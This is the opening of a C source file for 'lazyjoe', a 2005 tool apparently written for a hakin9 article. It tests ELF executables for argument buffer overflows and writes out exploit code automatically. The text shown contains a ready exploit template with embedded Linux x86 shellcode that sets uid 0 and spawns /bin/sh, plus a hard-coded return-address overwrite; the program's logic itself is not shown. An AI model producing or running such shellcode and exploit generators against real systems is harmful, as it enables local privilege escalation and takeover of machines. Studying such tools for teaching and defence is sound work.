/*
    lazyjoe v1.0-hakin9 -- arguments testing tool for elf executables
    Copyright (C) 2005 Lekkas Stavros <xfactor @ linuxmail.org>
    
    This program has been designed for the purposes of a hakin9 article.
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#define NAME          "lazyjoe"
#define VERSION       "v1.0-hakin9"
#define AUTHORS_EMAIL "xfactor<at>linuxmail.org"

#define EXP_BAN  "// Exploit code generated using lazyjoe.\n" \
                 "// Proof of concept for binary %s\n" \
                 "// Buffer overflow at argument %d\n\n"

#define LNX_EXP  "#include <string.h>\n#include <unistd.h>\n\n" \
                 "#define BIN \"%s\"\n#define NUM %ld\n\n" \
                 "char shellcode[]= \"\\x31\\xc0\\x31\\xdb\\xb0"   \
                 "\\x17\\xcd\\x80\"\n\t\t  \"\\x31\\xc0\\x50\\x68" \
		 "\\x2f\\x2f\\x73\\x68\"\n\t\t  \"\\x68\\x2f\\x62" \
		 "\\x69\\x6e\\x89\\xe3\\x50\"\n\t\t  \"\\x53\\x89" \
		 "\\xe1\\x99\\xb0\\x0b\\xcd\\x80\"\n\t\t  \"\\x31" \
		 "\\xc0\\x31\\xdb\\x40\\xcd\\x80\";\n\n" \
                 "int main(void)\n{\n char *env[2] = {shellcode, 0};\n" \
                 " char buffer[NUM + 5];\n unsigned long ret = 0xbffffffa " \
	         "- strlen(shellcode) - strlen(BIN);\n memset(buffer, " \
	         "0x41, NUM);\n *((long *)(buffer + NUM)) = ret;\n buffer[NUM + 5]" \
	         " = 0x00;\n "
                 //execl() will be crafted inside write_exp()

#define CLEAR(x) memset(x, 0x00, sizeof(x))

//Default values
#define DEF_LIMIT 	0x800    
#define MAX_LIMIT 	0x3D090
#define DEF_ARGS  	0x1
#define MAX_ARGS  	0x32

//Initial requirements
//The exported symbol may vary from distro to distro
// __LINUX__ or __LINUX or __linux__ are the most common 
#if !defined (__linux__)
#error ~ This application supports Linux only.
#endif

#if ( DEF_LIMIT > MAX_LIMIT )
#error ~ DEF_LIMIT cannot be larger than MAX_LIMIT.
#endif

#if ( DEF_ARGS > MAX_ARGS )
#error ~ DEF_ARGS cannot be larger than MAX_ARGS.
#endif

//Payload construction policies
#define _APPEND 	0x01
#define _REMOVE 	0x02

//Tools that are needed
#define TOOL_NUM 	3
#define GREP     	"/bin/grep"
#define GDB      	"/usr/bin/gdb" 
#define AWK      	"/usr/bin/awk"

//On the fly created files
#define RETF 		"ljoe.retfile"
#define CMDF 		"ljoe.cmdfile"

//Renaming of used data types
typedef struct user_regs_struct REGISTERS;
typedef long int                LINT;
typedef long long               LLONG;
typedef struct timeval          TIME_S;

//Function prototypes
void usage(char *);
int  check(void);
int  exists(char *);
int  intstrlen(int);
void printfixed(unsigned long);
int  is_exec_ELF(char *);
int  address_status(unsigned long);
LINT find_dist(char *, LINT, int);
char *make_payload(char *, int, LINT);
int  exec_and_inspect_1(char *, int, char *);
int  exec_and_inspect_2(char *, int, char *);
int  write_exp(char *, char *, LINT, int); 

//Global variables
TIME_S tv_start,
       tv_end;
int    ttyd    = 0,
       verbose = 0,
       mode    = 1,
       flag;
LLONG  counter_tot = 0;
